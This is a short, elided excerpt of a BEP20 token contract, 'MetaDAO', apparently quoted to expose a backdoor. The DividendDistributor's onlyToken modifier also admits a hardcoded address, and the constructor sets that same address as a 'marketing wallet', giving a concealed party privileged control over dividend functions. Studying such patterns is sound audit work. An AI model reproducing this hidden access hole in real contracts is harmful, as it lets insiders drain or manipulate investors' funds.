...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x8A5F8008ff13b78DE663Ffdc541435061520D1a1)); _;
    }
...
contract MetaDAO is IBEP20 , Auth, BaseToken {
    ...
    constructor(
		...
		_walletMax = totalSupply_.div(100).mul(50);
		swapThreshold = totalSupply_.mul(2).div(1000000);
        ...
        anothermarketingWallet = 0x8A5F8008ff13b78DE663Ffdc541435061520D1a1;
        anothermarketingWallet2 = 0x2f8F3F29a6aF497b863c4aa339DE3C1a6aE2acBe;       
